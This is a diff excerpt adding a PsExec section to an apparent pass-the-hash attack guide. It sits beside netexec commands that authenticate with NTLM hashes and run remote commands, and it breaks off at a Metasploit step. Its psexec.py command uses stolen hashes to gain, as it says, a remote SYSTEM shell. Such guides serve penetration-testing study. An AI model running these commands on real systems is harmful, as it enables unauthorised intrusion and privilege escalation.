@@ -50,6 +50,18 @@ netexec smb <target_ip> -u <username> -H <NTLM_hash> --admin
 netexec smb <target_ip> -u <username> -H <NTLM_hash> -x "whoami"
 ```
 
+#### Using PsExec
+
+**PsExec** is a Microsoft Sysinternals tool (and also a technique replicated by Impacket and Metasploit modules) that allows remote command execution via SMB.  
+With PtH, it can authenticate using **NTLM hashes** instead of passwords.
+
+```bash
+psexec.py <domain>/<username>@<target_ip> -hashes <LM_Hash>:<NT_Hash>
+```
+- `-hashes` allows direct use of NTLM hashes.
+
+- If the account is a local or domain admin, this spawns a remote SYSTEM shell.
+
 #### Using Metasploit
 
 1. **Search for a Suitable Module**: Use the `psexec` module, which supports NTLM hashes:
